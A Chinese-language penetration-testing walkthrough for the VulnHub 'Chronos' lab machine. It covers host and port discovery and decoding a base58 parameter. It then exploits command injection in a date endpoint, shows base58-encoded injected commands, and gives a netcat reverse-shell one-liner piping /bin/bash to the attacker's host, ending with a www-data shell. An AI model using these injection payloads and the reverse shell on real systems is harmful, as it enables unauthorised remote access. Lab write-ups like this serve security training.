chronos-1735

环境信息

靶机下载地址：https://www.vulnhub.com/entry/chronos-1,735/

kali攻击机：192.168.56.101

靶机：192.168.56.102

渗透测试

主机发现

netdiscover -r 192.168.56.0/24

发现靶机主机，IP是192.168.56.102

端口扫描

nmap -sS -T4 -v 192.168.56.102

发现主机对外开防22、80、8000端口，接下来依次对端口进行验证

信息收集

验证80端口

访问http://192.168.56.102

先查看网页源代码，发现页面中有一个js脚本

使用https://icyberchef.com在线工具对代码格式化

使用chatgpt对该代码进行分析

通过chatgpt可知该代码发送http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL请求，携带format参数指定在页面中的响应格式

先使用https://www.dcode.fr/identification-chiffrement在线识别4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL内容的编码方式，显示可能为base58

再使用magic模块对编码进行解码，解码后内容如下：

'+Today is %A, %B %d, %Y %H:%M:%S.'

发现请求的域名是chronos.local:8000，访问该网域名发现无法访问

猜想该域名可能就是靶机，修改本机的hosts文件将该域名映射到靶机IP

再次访问http://192.168.56.102，发现页面中按照指定格式显示了日期时间

再次思考http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL，date是Linux系统命令，format指定显示格式，猜测该参数是否直接与执行命令拼接的，是否存在命令注入漏洞

使用burpsuite代理浏览器，抓取访问http://192.168.56.102/的流量包

构造执行ls命令的编码

'+Today is %A, %B %d, %Y %H:%M:%S.' && ls

icyberchef使用To Base58模块，将上述字符串进行编码

编码后内容，使用该字符串发送请求

9bEW4cq4qengPvFGtzJXEAs1sGpKzYpYvUjwvUngwAmfrVsMwAERK9ox

发现成功执行命令，确认此处存在命令注入漏洞

由于是命令注入漏洞，查询系统是否有一些敏感命令，如查询/bin，/usr/bin，/usr/local/bin下

构造以下命令发送请求

'+Today is %A, %B %d, %Y %H:%M:%S.' && ls /bin
#base58编码后内容
5H77UDUtonCv1VbB617Za6BYECmuPVgQ9G7gWGjmswYscbm9hwpLwKo65N4YLcm

成功打印出文件内容，发现存在nc命令

自然象到使用nc执行反弹shell，但是此时不知道nc的版本，nc的版本不同可成功执行反弹shell的方式也不同。

以下nc 反弹shell方式不需要知道nc的版本

nc 192.168.56.101 1111|/bin/bash |nc 192.168.56.101 2222

构造执行该命令的编码

'+Today is %A, %B %d, %Y %H:%M:%S.' && nc 192.168.56.101 1111|/bin/bash |nc 192.168.56.101 2222
#base58编码后
44JeA6tmLVKD6fPUxR2nAtbBAtJTsBti19PzrZ7CpDB5ufo1z7JxkgthW5buzJ8SdbHqroBuF4dioLuoHkLnCrwzA65vjCv8fwxNNDjzFX38UTEtDR23DUnFZuFWY2c1Y5

先在kali上分别开启1111\2222端口的监听

nc -lvp 1111
nc -lvp 2222

发送请求执行反弹shell命令

响应提示Something went wrong，但是kali上成功接收到shell

当前用户是www-data
